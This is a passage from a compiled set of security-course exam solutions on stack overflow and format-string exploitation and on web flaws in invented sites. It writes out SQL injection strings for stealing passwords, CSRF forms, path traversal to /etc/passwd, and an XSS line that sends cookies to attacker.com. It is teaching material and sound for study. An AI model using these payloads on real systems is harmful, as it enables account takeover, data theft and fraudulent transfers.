- Overflow Exploit: Provide `-1` (0xFFFFFFFF) to the `%d` `scanf`. This sets `guardsAsleep`, `gateOpen`, `drawbridgeLowered`, and `torchLit` all to `true` (non-zero). This fulfills the condition `if (s.gateOpen && s.drawbridgeLowered...)` at line 25, leading to the vulnerable `printf(s.banner)`.
- Format String Exploit: We place the 8-byte shellcode inside the `s.banner` buffer (provided at line 17). We then use format string specifiers (e.g., `%n`) to overwrite the saved EIP (Instruction Pointer) on the stack. 
- Execution: The saved EIP is overwritten with the address of `s.banner` (plus an offset to skip the format string tokens). When the `main` function returns, it pops the modified EIP and jumps to our shellcode.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze a C program managing 'Provola' cheese orders. Identify a Buffer Overflow and Format String vulnerability. Write an exploit to execute shellcode and explain the memory layout.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerability Identification:
- Buffer Overflow: Lines 34-40. The loop condition is `i <= session.size_cashier`. Since arrays are 0-indexed, accessing index `size_cashier` (32) writes past the end of the 32-byte `cashier_name` array. This one-byte overflow corrupts the adjacent variable in the `Session` struct.
- Format String: Line 59 `printf(session.provola_type);`. The user input for `provola_type` is passed directly to `printf` without a format string specifier.

2. Exploit Chaining:
- The target is an 8-byte shellcode. The binary has NO mitigations (NX, ASLR, Canaries are disabled).
- Step 1: Trigger the off-by-one Buffer Overflow in the cashier loop. This one byte overwrites the least significant byte of `size_provola`, enlarging it significantly.
- Step 2: During the `fgets` call on line 46, because `size_provola` is now huge, we can input an arbitrarily long string into `provola_type`.
- Step 3: We use this massive `fgets` overflow to overwrite the saved EIP (Instruction Pointer) on the stack with the address of our shellcode. We can place the 8-byte shellcode right inside the oversized payload.

3. Memory Layout (Buffer Overflow):
- The stack grows downwards (High to Low addresses).
- Variables in the struct: `provola_type[4]` (Low), `cashier_name[32]`, `size_provola`, `size_cashier` (High).
- Saved EBP and saved EIP are located below the local variables (at higher addresses relative to the struct).
- The overflow from `cashier_name` hits `size_provola`. The subsequent massive overflow from `provola_type` pushes all the way through the struct, past the saved EBP, and overwrites the saved EIP with the address pointing to our shellcode.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Analyze the automatic corrector for a malware exercise. Identify a Buffer Overflow and Format String vulnerability. Write an exploit to manipulate the execution flow, considering Stack Canary mitigations.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
Step-by-Step Solution:

1. Vulnerabilities Identification:
- Buffer Overflow: Line 26 `scanf("%s", student_name);`. The `student_name` array is fixed at `NAME_SIZE` (32 bytes), but `%s` reads input until a whitespace is encountered, with no length limit. Entering >32 bytes overwrites adjacent stack memory.
- Format String: Line 36 `printf(student.notes);`. The user-supplied `notes` buffer is printed directly. If the user inputs format specifiers (e.g., `%x`, `%n`), they can leak stack memory or write to arbitrary addresses.

2. Exploit with Stack Canaries Enabled:
- Goal: Execute the `max_grade` function to obtain a score of 6.
- Mitigation Context: A Stack Canary is present between the local variables and the saved EIP. If we use the Buffer Overflow to overwrite the saved EIP, we will inevitably overwrite the canary. When the function returns, the system checks the canary, detects the corruption, and aborts the program. We cannot leak the canary via the buffer overflow.
- Format String Exploit: Because ASLR is disabled, stack and binary addresses are predictable. We can bypass the canary entirely using the Format String vulnerability.
- Steps:
  1. Run the program locally to determine the exact memory address of the `max_grade` function in the ELF binary.
  2. Determine the stack address of the saved EIP for the `set_notes` function.
  3. Use environment variables or arguments to place our target write address (the address of saved EIP) onto the stack.
  4. Craft a format string payload (placed in `notes`) using `%c` to pad output length and `%n` to write the address of `max_grade` directly into the saved EIP. 
  5. When `set_notes` returns, the canary is valid (untouched), and the program jumps to `max_grade`.
\end{verbatim}


\section{Web Vulnerabilities}
Web application security issues like SQL Injection, XSS, and CSRF are covered here. Solving these requires an understanding of input validation, session management, and how web requests interact with backend systems.

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
TicketUno.it is a popular Italian ticketing platform... 4.1 Answer the following questions: For each SQL injection vulnerability... For each XSS vulnerability... For each function, specify whether it is vulnerable to CSRF... 4.2 Last night I was turned away at the entrance of a concert... Can you reproduce the exploit?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
4.1 SQLi: Present on line 7, variable `event_name`. Motivation: The query is concatenated directly with the user input and without sanitization. XSS: Present. Motivation: User input is not sanitized. Variable `booking_ref`, Reflected XSS, lines to sanitize: 21. CSRF: Neither function is vulnerable. Motivation: There are no state-changing actions. Therefore, no need for a CSRF token.

4.2 The exploit leverages an SQL injection vulnerability on the event_name variable. `event_name = "not_a_valid_suffix' UNION ALL SELECT booking_ref, booking_ref, booking_ref FROM bookings WHERE user_id = (SELECT user_id FROM users WHERE username='Law'); -- "`

### Improved Step-by-Step Explanation:
For 4.1: 
- SQL Injection: Line 7 builds the query `q = "SELECT ... WHERE event_name LIKE '%" + event_name + "%';"`. Since `event_name` comes directly from the request arguments without sanitization or prepared statements, it's vulnerable to SQLi. Line 19 uses a prepared statement, so it's safe.
- XSS: Line 21 reflects the `booking_ref` from user input directly into the HTML response `return render_template("booking.html", error="No booking found with reference: " + booking_ref)`. Since `render_template` performs no sanitization, this leads to Reflected XSS.
- CSRF: Cross-Site Request Forgery typically targets state-changing actions (like modifying a profile, transferring funds, or making a booking). Here, `search_events` and `retrieve_booking` only retrieve data. They are safe from CSRF.
For 4.2: To steal the booking reference of user 'Law', we use a UNION-based SQL injection on the `event_name` parameter in `search_events`. The original query selects 3 columns (`event_name`, `venue`, `event_date`). Our injected payload must match this column count. We close the original string matching with `'`, append a `UNION ALL SELECT`, and fetch the `booking_ref` three times to match the column count. We filter the results by the `user_id` corresponding to the username 'Law', and comment out the rest of the original query with `-- `.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
PosteItaliche.it is a popular Italian web platform... 1. [1 point] For each SQL injection vulnerability... 2. [1 point] For each XSS vulnerability... 3. [1 point] For each function, specify whether they are vulnerable to CSRF attacks. 4. [1.5 points] My account has been hacked! For some reasons an evil user managed to log in with my account. Can you reproduce the exploit? 5. [1.5 points] Yesterday, I clicked on a link I received in an email... Can you reproduce the exploit?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. SQLi: Line 33, Variables: `recipient_mail`, `text`.
2. XSS: None present.
3. CSRF: `send_email` is Vulnerable. Motivation: The random number is predictable because the generator is seeded with the current time at second-level granularity.
4. The attacker just performed an SQLI and retrieved the password of your account. If we suppose that the mail of the attacker is evil@posteitaliche.it the SQLI is as follows: `text = "some_text'), ('evil@posteitaliche.it', 'evil@posteitaliche.it', (SELECT password FROM users where email='<victim_email>')); -- "`
5. The attack is a CSRF attack where the attacker embedded a script to run 2 requests into the page of italicheposte.it: a GET request and a POST request. With the GET request.

### Improved Step-by-Step Explanation:
For 1: Line 31-32 construct an `INSERT` query via string concatenation: `"INSERT INTO emails VALUES ('" + sender_email + "', '" + recipient_mail + "', '" + text + "');"`. `recipient_mail` and `text` are derived directly from user input without SQL sanitization, making them vulnerable to SQL Injection.
For 2: XSS is not present because the application correctly uses `xss_sanitize()` on `recipient_mail` and `text` before reflecting them, and other inputs like `error` or `success` messages are statically defined in the code.
For 3: The CSRF protection mechanism is fundamentally flawed. `set_csrf` seeds the PRNG using the current timestamp in seconds: `random.seed(int(get_time()))`. This makes the generated `csrf_token` entirely predictable. An attacker can determine the server's time, generate the exact same token, and construct a valid CSRF payload to trick a victim into submitting an unauthorized request to `send_mail`.
For 4: The attacker uses the SQL injection in the `INSERT` statement to steal the victim's password. By crafting a payload in the `text` field, the attacker closes the initial `VALUES` tuple and injects an additional tuple. This secondary tuple inserts a new email record where the `recipient_mail` is the attacker's email, and the `text` field contains a subquery: `(SELECT password FROM users where email='victim@email.com')`. When the attacker views their inbox, they see the victim's plaintext password.
For 5: The exploit is a two-step CSRF attack. First, the attacker's malicious page forces the victim's browser to make a GET request to a predictable endpoint to figure out the time or establish a session if needed. Then, knowing the PRNG seed (the current time), the attacker computes the valid CSRF token. Finally, the malicious page triggers a POST request to `/send_mail` with the calculated CSRF token, sending spam emails on behalf of the victim.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
LetsComplain is a new website for students and profs. Students here can complain about exams and professors can handle the complaints and register their exams. Get ready to hack this website.
The relevant pseudo-code of the forum is the following:
[Web code snippets and DB structure]
1. [3 points] Based on the available pseudo-code and assumptions, fill out the following table by answering the questions for each class of vulnerabilities.
Sql Injection (SQL-I)
cross-site scripting (XSS) Specify if reflected, stored, DOM...
Cross-site request forgery (CSRF)

2. [1.5 points] Can you register a user ‘ikiga1’ as a Professor? Discuss your exploit in detail and specify the credentials you will use to login as a professor.
3. [1.5 points] Can you leak the id of Prof. Polino? Discuss your exploit in detail and why it works. State all the relevant assumptions.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**1. Vulnerability Assessment:**
- **SQL Injection (SQL-I)**: **Present.** Vulnerable lines: `register()` at line 11 (the `password` parameter is concatenated directly without validation) and `complain()` at line 45 (the `complaint` parameter allows single quotes since `html_escape_minimal` only escapes `<, >, ", &`). To fix, refactor the database queries to use prepared statements (parameterized queries).
- **Cross-site Scripting (XSS)**: **Not present.** In the provided code, user inputs that are later reflected or stored (like `complaint`) are explicitly sanitized using `html_escape_minimal()`, which converts angular brackets and ampersands into safe HTML entities, neutralizing XSS payloads. Additionally, `username` is strictly constrained to alphanumerics.
- **Cross-site Request Forgery (CSRF)**: **Present.** The state-changing POST endpoints (such as `complain()`) do not implement CSRF protection. An attacker can construct a malicious HTML page with an auto-submitting form targeting the endpoint. If an authenticated user visits the attacker's page, their browser will unknowingly submit the complaint. To fix, implement robust Anti-CSRF tokens in forms and validate them on the server.

**2. Registering 'ikiga1' as a Professor:**
Yes. The `password` parameter in the `register()` function is vulnerable to SQL injection. The query structure is:
`INSERT INTO User (username, password, prof) VALUES ('" + username + "','" + password + "', False);`
If we supply the username as `ikiga1` and craft the password as `hacked', True) -- `, the resulting query executed by the database becomes:
`INSERT INTO User (username, password, prof) VALUES ('ikiga1','hacked', True) -- ', False);`
The `-- ` comments out the rest of the original query, successfully inserting a row where `username` is `ikiga1`, the password is `hacked`, and the `prof` boolean is set to `True`. The credentials to log in will be `ikiga1` : `hacked`.

**3. Leaking Prof. Polino's ID:**
Yes, by leveraging the SQL injection vulnerability in the `complain()` function. The query structure is:
`... VALUES (" + id + "," + exam_id + ",'" + complaint + "');`
Since `html_escape_minimal` allows single quotes, we can inject a subquery into the `complaint` field using string concatenation (e.g., `||` in SQLite/PostgreSQL or `CONCAT` in MySQL).
We submit the following payload for the `complaint` parameter:
`' || (SELECT id FROM User WHERE username='polino') || '`
This alters the query to:
`... VALUES (1, 126, '' || (SELECT id FROM User WHERE username='polino') || '');`
The database will execute the subquery, retrieve Polino's ID (212), and insert it as the text body of the complaint. By navigating to the personal page to view the submitted complaint, the ID will be visibly leaked on the frontend. This assumes the underlying database engine supports the `||` concatenation operator and subqueries in the `VALUES` clause.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Code snippet provided for a web application handling user profiles and image uploads. Includes functions `is_xss_free`, `profile`, and `upload_image`. JavaScript code for client-side image format validation is also provided. Database schema for the `USER` table is given.

[3 points] 1. Fill out the following table by answering the questions for each class of vulnerabilities. While answering the questions, be exhaustive, concise, and straight to the point. If you believe there might be a vulnerability, specify all the corresponding line/s of code.
- SQL Injection (SQL-I)
- Cross-site scripting (XSS)
- Cross-site request forgery (CSRF)

[1.5 points] 2. One user managed to create a web page on Threat’s domain that shows the message “Alert: You have been hacked!”. Can you reproduce the exploit? Explain all the steps you would take to reproduce the exploit, including the final code you would write and why it works.

[1.5 points] 3. Some students are reporting issues with their profile image. Every now and then, their image becomes a black and white flag with a skull on top. Moreover, the image is not static and the flag is waving! It looks like the new image is a gif, instead of a jpeg. We never programmed something like this to happen, some attacker must be tampering with Threats.
1. Identify the vulnerability(ies) that enable the attack and the necessary assumptions, if any.
2. Explain all the steps you would take to reproduce the exploit, targeting @TEST_ACCOUNT, without relying on user interaction.
3. Suggest the best way to fix the problems.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### Question 1: Vulnerability Assessment Table

| Vulnerability Class | Is there a vulnerability? How to exploit? | Simplest procedure to remove it |
| :--- | :--- | :--- |
| **SQL Injection (SQL-I)** | **No.** The provided Python snippet only uses prepared statements (`db_execute_query_with_statement(user_query, handle)`). Prepared statements separate the query structure from the data, making SQL injection impossible here. | N/A (Already secure) |
| **Cross-site scripting (XSS)** | **Yes (Reflected XSS).** At line 19: `return "No user handle \"" + handle + "\" was found."` The application takes the `handle` parameter from the URL query string (line 12) and reflects it directly into the HTML response without sanitization. An attacker can craft a malicious URL containing a script in the `handle` parameter. | Use escaping functions or templating engines. |
| **Cross-site request forgery (CSRF)** | **Yes.** The `/upload_image` route (line 26) handles state-changing POST requests but lacks CSRF protection (like an anti-CSRF token). An attacker can create a malicious website containing a hidden form that submits a request to `/upload_image`. If a logged-in victim visits this evil site, their browser will automatically include their session cookie, and the attacker can change the victim's profile picture. | Implement Anti-CSRF tokens. |

### Question 2: Reproducing the Reflected XSS Exploit

**Goal:** Execute `alert("Alert: You have been hacked!")` in the victim's browser.

**Step-by-step Exploitation:**

1.  **Identify the Input Vector:** The vulnerability is in the `handle` GET parameter on the `/profile` endpoint.
2.  **Analyze the Filter:** The application attempts to block XSS using the `is_xss_free` function which only checks for exact matches of lowercase "script" or uppercase "SCRIPT". It does not account for mixed-case variations.
3.  **Bypass the Filter:** We can bypass this by using mixed casing for the HTML tag, such as `<ScRiPt>` or `<SCRipt>`.
4.  **Craft the Payload:** The payload to inject is `<SCRipt>alert("Alert: You have been hacked!")</SCRipt>`.
5.  **Final Exploit URL:** The attacker sends the following malicious link to a victim:
    `https://threats.com/profile?handle=<SCRipt>alert("Alert: You have been hacked!")</SCRipt>`

**Why it works:** The server reflects the payload into the page source because `<SCRipt>` escapes the filter block. The victim's browser parses the HTML, executes the injected JavaScript, and displays the alert box.

### Question 3: The Waving Flag (GIF) Exploit

**1. Identify Vulnerabilities:**
-   **Path Traversal (Server-Side):** At line 39: `img_path = "/images/"+ user_id + image.filename`. The `image.filename` is taken directly from user input without sanitization. An attacker can use `../` sequences to traverse directories and overwrite arbitrary files.
-   **Inadequate File Validation (Client-Side Only):** The checks to ensure the uploaded file is a JPEG are implemented *only in JavaScript* on the client side. Client-side checks can be easily bypassed.

**2. Reproducing the Exploit (Targeting @TEST_ACCOUNT):**
-   **Steps:**
    1.  The attacker creates an HTTP POST request to `/upload_image`.
    2.  Instead of using the browser form, the attacker crafts the multipart form data manually to bypass the JavaScript checks.
    3.  The attacker uploads their malicious GIF file (the waving flag).
    4.  The attacker tampers with the `filename` parameter in the request payload, setting it to: `../TEST_ACCOUNT/profile_image`.
    5.  When the server executes `img_path = "/images/"+ attacker_id + "../TEST_ACCOUNT/profile_image"`, the path resolves to `/images/TEST_ACCOUNT/profile_image`.
    6.  The `image.save(img_path)` function overwrites the victim's image with the attacker's GIF.

**3. Remediation:**
-   Move all file format checks to the backend (Python code) and check the actual MIME type of the uploaded file.
-   Prevent Path Traversal by generating safe random unique identifiers for filenames on the server-side, ignoring user-provided filenames.
-   Implement CSRF tokens.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
PayDude application code in Python... Fill out the following table by answering the questions for each class of vulnerabilities... Can you reproduce the exploit?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: SQL Injection (SQLi)**
- **Vulnerability**: Line 16 uses raw string concatenation to build the SQL query: `"SELECT balance FROM USERS WHERE user_id = " + sender + " AND balance < " + amount`. An attacker controlling `amount` can inject malicious SQL.
- **Exploitation (Password Leak)**: An attacker can input a negative/small amount so the first part of the query is false, and append a `UNION` statement: `0 UNION SELECT hashed_password FROM USERS WHERE user_id = 1234`. The application will treat the retrieved password hash as the balance and reflect it on the screen: `"Your balance is " + current_balance`.
- **Fix**: Use parameterized queries (prepared statements) where user inputs are treated strictly as data, not executable code.

**Step 2: Cross-Site Scripting (XSS)**
- **Vulnerability**: Not present in the provided snippets. The variable `current_balance` is sanitized using `xss_sanitize()` before being passed to the template.

**Step 3: Cross-Site Request Forgery (CSRF)**
- **Vulnerability**: The application attempts CSRF protection but implements it poorly. The CSRF token is purely numeric and only 2 digits long (`generate_token(2)`), giving only 100 possible combinations (00 to 99).
- **Exploitation**: An attacker can host a malicious webpage containing a hidden form targeting the `/send_money` endpoint. They can guess a token (e.g., `11`). When a logged-in user visits the attacker's page, the form is automatically submitted (`onload=click()`). With only 100 possible tokens, this attack has a 1% success rate per attempt, which is highly effective if distributed widely or embedded in an iframe that tries multiple times.
- **Fix**: Increase the entropy of the CSRF token significantly (e.g., use a 32-character long string consisting of secure random uppercase, lowercase, and numeric characters).
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
StoryShelf.com application... Fill out the following table... Can you reproduce the exploit?... path traversal...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: SQL Injection (SQLi)**
- **Vulnerability**: Line 10 (`check_query = "SELECT * FROM BOOKS WHERE title='" + book_name + "%';"`). The input `book_name` is concatenated directly into the query.
- **Exploitation**: This is a Blind SQL Injection. Since the application only checks `if len(result) != 1:` and returns an abort if true, an attacker cannot see direct database output. They must use boolean-based inference (e.g., injecting `book' AND (SELECT substring(password,1,1) FROM users)='A'#`) to slowly extract data byte-by-byte based on whether the page loads normally or returns a 403 error.
- **Fix**: Replace concatenation with parameterized queries.

**Step 2: Cross-Site Scripting (XSS)**
- **Vulnerability**: Line 41 (`<h2>Page: {{page_num}}</h2>`). The `page_num` is taken directly from the URL parameter and rendered without sanitization.
- **Exploitation**: An attacker sends a malicious link: `StoryShelf.com/book/Title?page=<script>alert("Why would you read a book if you can watch the movie?!?!");</script>`. The victim clicks the link, and the browser executes the injected JavaScript.
- **Fix**: Apply HTML entity encoding/escaping to `page_num` before rendering it in the template.

**Step 3: Path Traversal**
- **Vulnerability**: Line 15 (`page_path = "books/" + book_name + "/" + page`). The `page` variable is entirely user-controlled and passed directly to file system operations (`exists` and `open`).
- **Exploitation**: An attacker can use dot-dot-slash notation to escape the intended directory and read sensitive server files. Payload: `?page=../../../../../../etc/passwd`.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
OpenMessages.com code... Fill out the following table... extract the password... leak the conversation...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: SQL Injection (SQLi)**
- **Vulnerability**: Line 25 concatenates user input directly: `query = "SELECT... WHERE (receiver = '" + my_number + "' AND sender '" + contact_number + "')..."`. 
- **Exploitation (Conversation Leak)**: An attacker can set `contact_number` to malicious SQL logic. To leak a conversation between two victims (+39 333 1122333 and +39 333 7788999), the attacker logs in and sets their own `contact_number` payload to forcefully override the `WHERE` clause: `') OR (receiver = '+39 333 1122333' AND sender '+39 333 7788999') OR (receiver = '+39 333 7788999' AND sender '+39 333 1122333') ; --`. The `--` comments out the rest of the original query, tricking the DB into returning the private conversation to the attacker's screen.
- **Fix**: Use parameterized queries (`db_execute_query_with_statement`).

**Step 2: Cross-Site Scripting (XSS)**
- **Vulnerability**: Line 35 (`<p>{{ message["message"] }}</p>`). The stored message is rendered directly into the HTML without sanitization.
- **Exploitation (Stored XSS)**: An attacker sends a message containing a malicious JavaScript payload to a victim: `<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>`. When the victim opens their private messages, the browser executes the script, stealing their session token.
- **Fix**: The template engine must escape HTML entities before rendering.

**Step 3: Cross-Site Request Forgery (CSRF)**
- **Vulnerability**: The `/send_message` endpoint relies only on session cookies and lacks any CSRF token verification.
- **Exploitation**: An attacker crafts a malicious site with a hidden form pointing to `OpenMessages.com/send_message`. When an authenticated victim visits the attacker's site, the form auto-submits, sending messages on the victim's behalf without their knowledge.
- **Fix**: Generate a cryptographically secure, unpredictable CSRF token upon login, store it in the session, and require it as a hidden field in all state-changing POST requests.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Introducing danGPT... relevant code... Fill out table... prank a friend by making him add an embarrassing question...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Vulnerabilities**
1. **SQL Injection (SQLi)**: Occurs at line 37 in the `/list_questions` endpoint: `query += " AND question LIKE '%" + request.args['search'] + "%';"`. User input is blindly concatenated into the SQL statement, allowing attackers to manipulate the logic.
2. **Cross-Site Scripting (XSS)**: Occurs at line 29 in the `/get_question` endpoint. While the `answer` is sanitized, the `question` is rendered directly into the HTML without sanitization, allowing Stored XSS.
3. **CSRF Token Flaw**: While a CSRF token exists, it is static per user (tied to their UUID). If an attacker obtains a user's static token, they can forge requests indefinitely.

**Step 2: Crafting the Exploit Chain (The Prank)**
- **Goal**: Force a friend's browser to submit a POST request to add the question "I am dumb".
- **Step 2a (Leak the Token)**: We must first obtain the friend's static CSRF token. We use the SQLi vulnerability in `/list_questions`. We craft a URL: `danGPT.com/list_questions?search=nothing%' UNION SELECT user_csrf_token, username FROM USERS WHERE username = 'friend_username'; --`. When the friend clicks this, the database will return their secret CSRF token instead of questions.
- **Step 2b (The CSRF Attack)**: We create a malicious HTML page hosting a hidden form targeting the `/question` POST endpoint. 
  ```html
  <form id="prank" method="POST" action="dangpt.com/question">
    <input type="hidden" name="question" value="I am dumb">
    <input type="hidden" name="csrf_token" value="[LEAKED_TOKEN]">
  </form>
  <script>document.getElementById('prank').submit();</script>
  ```
- **Step 2c (Execution)**: We send this malicious page to the friend. When they open it, their browser automatically submits the form using their legitimate session cookies and the leaked CSRF token, successfully adding the embarrassing question.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities (6 points)}
\subsubsection*{Problem}
\begin{verbatim}
Welcome to WesterosBank...
[Code snippet of send and login routes, SQL tables]
00 @app.route('/send, methods = ['GET'])
01 def send(request, session):
...
18 check_r = "SELECT user_id FROM users WHERE username = '" + receiver + "';"
19 result = db_exequte_query(check_q)
20 if not result:
21 return render_template("home.html", error="Receiver" + xss_sanitize(receiver) + " not found!")
...
[3 points] 1. Fill out the following table by answering the questions for each class of vulnerabilities... SQL Injection (SQL-I), cross-site scripting (XSS), Cross-site request forgery (CSRF)
[1.5 points] 2. After visiting a link on 4chan.com, you notice that your balance has decreased by 1000$ since you sent that amount to the user Law. However, you clearly didn’t want to send such an amount to Law. Can you reproduce the exploit? Explain all the steps you would take to reproduce the exploit...
[1.5 points] 3. You suddenly notice that somebody transferred all the money to a user. You suspect that somebody logged in with your profile even if your password is secure. Can you explain how somebody could have obtained your password? Explain all the steps you would take to reproduce the exploit...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Web Vulnerabilities.**
Let's analyze the code against standard web vulnerabilities:
- **SQL Injection (SQLi):** Look at how user inputs are concatenated into SQL queries.
  In `send()`, line 18: `check_r = "SELECT user_id FROM users WHERE username = '" + receiver + "';"`. The `receiver` variable is directly taken from `request["receiver"]` and appended to the string. This is a classic SQL injection flaw. An attacker can input `' OR '1'='1` to alter the query logic.
  How to fix: Use parameterized queries (prepared statements), just as the `login` function correctly does on line 38 (`db_execute_query_with_statement`).
- **Cross-Site Scripting (XSS):** Look for places where user input is reflected in the HTML without sanitization.
  In `send()`, line 21: `return render_template("home.html", error="Receiver" + xss_sanitize(receiver) + " not found!")`. The developer explicitly used `xss_sanitize()` here. So XSS is mitigated.
- **Cross-Site Request Forgery (CSRF):** Look at state-changing actions (like transferring money) and how they are triggered.
  The `/send` endpoint is a `GET` request. It checks `is_session_valid(session)` but it has no CSRF token. If an authenticated user clicks a malicious link, their browser will automatically include their valid session cookie, executing the transfer without their consent.
  How to fix: Use `POST` for state-changing actions and require an unpredictable, user-specific CSRF token in the request body that the server validates before executing the transaction.

**Step 2: Reproducing the CSRF Attack.**
Since the `/send` endpoint operates via `GET` and lacks CSRF protections, an attacker simply needs to construct a URL that triggers the transfer and convince a logged-in user to visit it.
The URL requires `receiver` and `amount` parameters.
Attacker constructs: `https://westerosbank.com/send?amount=1000&receiver=Law`
The attacker can embed this in an `<img>` tag on a malicious site or a forum like 4chan: `<img src="https://westerosbank.com/send?amount=1000&receiver=Law" width="0" height="0">`. When the victim's browser tries to load the "image", it makes the GET request. If the victim is logged into WesterosBank, their cookies are sent, and the bank processes the valid transfer.

**Step 3: Exploiting the SQL Injection to Steal Passwords (Blind SQLi).**
The vulnerability is on line 18: `SELECT user_id FROM users WHERE username = '<receiver>'`.
If the query returns a row, the code proceeds to update balances. If it returns no row, it throws a "Receiver not found" error (line 21).
This boolean outcome (Error vs. Success/Different Error) creates a side-channel for a **Blind Boolean SQL Injection**. We can ask the database true/false questions and infer the answers based on the application's response.
To steal a password, we can inject a condition into the `WHERE` clause that tests the characters of the victim's password one by one.
Payload for `receiver`: `nonexistent_user' OR username='target_victim' AND password LIKE 'a%`
The resulting query becomes:
`SELECT user_id FROM users WHERE username = 'nonexistent_user' OR username='target_victim' AND password LIKE 'a%';`
- If the victim's password starts with 'a', the condition is TRUE. The query returns a user_id, and the application proceeds (we'll likely get a different error later, or a success message if we set `amount` correctly, but definitely *not* the "Receiver not found" error).
- If the password does not start with 'a', the condition is FALSE. The query returns empty, and the application shows "Receiver not found".
By automating this process, iterating through characters (`a%`, `b%`, `c%`...) and then expanding (`aa%`, `ab%`...), an attacker can extract the entire password character by character without ever seeing the database output directly.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
ChatterChaos is a web service for group chatting. Users can view and post messages in channels of personal interest. The relevant code of the application is reported below.
Assume the following: The session is correctly handled; is_session_valid correctly checks if the user is logged in; db_execute_query_with_statement correctly executes queries with prepared statements; render_template does not perform any sanitization of the input; The DBMS does not support stacked queries; The DBMS is case-sensitive; The username is checked with the function blacklist available in the code; is_numeric returns true if the string contains only numbers.

1. [3 points] Fill out the following table by answering the questions for each class of vulnerabilities (SQL Injection, XSS, CSRF).
2. [1.5 points] After visiting a streaming website, you notice that somebody posted several messages on many channels with your username. These messages advertise a cryptocurrency service that you don’t even know. Can you reproduce the exploit? Explain all the steps you would take to reproduce the exploit, including the final code you would write.
3. [1.5 points] The channel dedicated to animal discussion has been hacked. Every time you visit the page of the channel, a popup appears saying, “Who’s the king of the jungle!!!”. Explain all the steps you would take to reproduce the exploit. The final code does not need to be syntactically correct, but it has to point where is the vulnerability and the idea of the exploit.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step-by-Step Pedagogical Solution:**

**Question 1: Vulnerability Table**
- **SQL Injection (SQLi)**: **No**. The code relies exclusively on parameterized queries (`db_execute_query_with_statement`), safely separating SQL logic from user data.
- **Cross-Site Scripting (XSS)**: **Yes (Stored XSS)**. On lines 82-83, the user's input for `color` is injected directly into the `style` HTML attribute without context-aware escaping. The `blacklist` function filters angle brackets, but breaking out of an attribute context does not require them. *Fix*: Implement strict whitelisting for allowed colors and use proper HTML escaping.
- **Cross-Site Request Forgery (CSRF)**: **Yes**. The `post_message` function performs a state-changing action (posting a message) but only verifies session cookies. It lacks anti-CSRF tokens to verify that the request originated intentionally from the legitimate application interface. *Fix*: Implement synchronizer CSRF tokens.

**Question 2: Reproducing the CSRF Exploit**
*Mechanism*: The attacker hosts a malicious web page (e.g., on a streaming site). When the authenticated ChatterChaos user visits this page, it automatically triggers a cross-origin `POST` request to the ChatterChaos server. The victim's browser automatically attaches their session cookies, making the request valid.
*Exploit Code*: The attacker embeds a hidden, auto-submitting form on their site:
```html
<form method="POST" action="http://chatterchaos.com/post_message">
  <input type="hidden" name="channel_id" value="100">
  <input type="hidden" name="message" value="You want some easy money! Visit easycrypto.com!">
  <input type="submit" onload="this.click()">
</form>
```

**Question 3: Reproducing the Stored XSS Exploit**
*Mechanism*: We exploit the vulnerable `color` input which is rendered as `<p style="color:{{ message["color"] }};" ...>`. We can input a payload that breaks out of the CSS style attribute and injects a new JavaScript event handler, completely bypassing the angle-bracket blacklist.
*Exploit Steps*:
1. The attacker submits a valid POST request to the target channel.
2. In the `color` field, the attacker provides a crafted payload: `black" onmouseover="alert('Who’s the king of the jungle!!!')`
3. The server stores this in the database.
4. When a user visits the channel, the template engine renders the HTML as:
   `<p style="color:black" onmouseover="alert('Who’s the king of the jungle!!!')";" onclick="font-weight:bold">`
5. When the victim hovers their mouse over the message, the JavaScript popup executes in their browser.
\end{verbatim}

\subsection{Exercise 4 - Web Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Review the provided Python Flask application code managing an AI chat platform.

1. Fill out the table by identifying if SQL Injection, Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF) vulnerabilities exist, how they could be exploited, and the simplest procedure to remove them.
2. You suddenly notice that somebody logged in to your account since all the chats have been deleted. Can you explain how somebody could have obtained your password? Explain all the steps you would take to reproduce the exploit, including the final code you would write.
3. Your friend sent you a link to one of her public chats. After opening a link, a popup appears saying, “AI will take over the world!!!”. Explain all the steps you would take to reproduce the exploit, including the final code you would write.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### 1. Vulnerability Identification and Mitigation
**Step-by-Step Reasoning:**
- **SQL Injection (SQLi):**
  - *Presence:* Yes, present at lines 1-5 inside `load_history`.
